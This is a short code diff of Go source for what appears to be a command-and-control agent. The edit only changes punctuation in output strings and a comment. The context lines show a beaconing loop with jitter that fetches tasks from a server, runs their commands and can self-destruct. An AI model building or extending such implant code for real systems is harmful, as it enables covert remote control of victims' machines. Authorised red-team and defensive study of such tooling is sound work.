@@ -40,7 +40,7 @@ func main() {
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
-	fmt.Printf("\n[*] Starting check-in loop (jitter: %s – %s)…\n\n", JitterMin, JitterMax)
+	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", JitterMin, JitterMax)
 
 	for {
 		tasks, err := checkIn(hostname, agentOS)
@@ -50,7 +50,7 @@ func main() {
 			continue
 		}
 
-		fmt.Printf("[+] Checked in — %d pending task(s)\n", len(tasks))
+		fmt.Printf("[+] Checked in - %d pending task(s)\n", len(tasks))
 
 		for _, task := range tasks {
 			fmt.Printf("[>] Executing task #%d: %s\n", task.ID, task.Command)
@@ -61,7 +61,7 @@ func main() {
 				funcs.SelfDestruct()
 			}
 
-			// cd is handled synchronously — it mutates CurrentDir which subsequent commands depend on
+			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
 			if funcs.IsCdCommand(task.Command) {
 				output, cdErr := funcs.ExecuteCommand(task.Command)
 				if cdErr != nil {
